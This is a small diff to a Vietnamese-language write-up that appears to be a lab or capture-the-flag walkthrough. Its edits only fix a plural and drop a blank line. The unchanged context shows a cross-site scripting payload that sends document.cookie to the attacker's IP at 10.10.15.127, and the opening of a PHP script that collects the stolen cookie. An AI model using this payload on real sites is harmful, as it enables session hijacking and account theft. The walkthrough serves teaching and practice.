@@ -247,7 +247,7 @@ Tiếp tục:
 ![](images/18.png)
 
 
-Sẽ có 2 request chính
+Sẽ có 2 requests chính
 
 Comment
 
@@ -278,7 +278,6 @@ new Image().src='http://10.10.15.127/index.php?c='+document.cookie;
 ```
 
 Put this in index.php
-
 ```php
 <?php
 if (isset($_GET['c'])) {
